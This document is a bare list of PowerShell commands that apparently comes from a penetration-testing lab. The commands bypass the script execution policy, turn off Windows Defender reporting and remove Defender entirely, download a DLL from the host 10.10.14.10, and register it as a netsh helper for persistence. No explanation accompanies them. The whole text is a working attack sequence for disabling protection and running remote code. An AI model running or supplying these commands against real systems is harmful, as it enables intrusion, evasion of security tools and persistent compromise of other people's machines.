powershell Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
powershell Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0
powershell Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
powershell wget -O netshhelper.dll http://10.10.14.10/netshhelper.dll
powershell netsh add helper C:\Users\grisun0\netshhelper.dll
netsh